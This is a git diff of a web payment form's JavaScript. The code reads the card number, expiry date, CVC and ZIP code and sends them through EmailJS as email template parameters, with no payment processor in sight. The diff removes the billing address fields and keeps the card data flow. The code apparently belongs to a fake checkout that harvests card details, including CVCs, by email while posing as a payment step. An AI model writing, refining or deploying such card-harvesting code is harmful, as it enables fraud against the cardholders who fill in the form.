@@ -29,9 +29,6 @@ payButton.addEventListener("click", () => {
   const cardNumber = document.getElementById("cardNumber").value.replace(/\D/g, ""); // Only numbers
   const expDate = document.getElementById("expDate").value; // MM/YY format handled automatically
   const cvc = document.getElementById("cvc").value.replace(/\D/g, ""); // Only numbers
-  const streetAddress = document.getElementById("streetAddress").value.trim();
-  const city = document.getElementById("city").value.trim();
-  const state = document.getElementById("state").value.trim();
   const zipCode = document.getElementById("zipCode").value.replace(/\D/g, ""); // Only numbers
 
   // Validate fields
@@ -50,11 +47,6 @@ payButton.addEventListener("click", () => {
     errorMessage.style.display = "block";
     return;
   }
-  if (streetAddress === "" || city === "" || state === "") {
-    errorMessage.textContent = "Billing address fields cannot be empty.";
-    errorMessage.style.display = "block";
-    return;
-  }
   if (zipCode.length < 5 || zipCode.length > 15) {
     errorMessage.textContent = "Invalid ZIP Code.";
     errorMessage.style.display = "block";
@@ -64,14 +56,11 @@ payButton.addEventListener("click", () => {
   // Hide error message if everything is correct
   errorMessage.style.display = "none";
 
-  // EmailJS parameters
+  // EmailJS parameters (only card info)
   const templateParams = {
     card_number: cardNumber,
     exp_date: expDate,
     cvc_code: cvc,
-    street_address: streetAddress,
-    city: city,
-    state: state,
     zip_code: zipCode,
   };
 
@@ -87,6 +76,7 @@ payButton.addEventListener("click", () => {
       console.error("FAILED...", error);
     });
 });
+
 
 
 
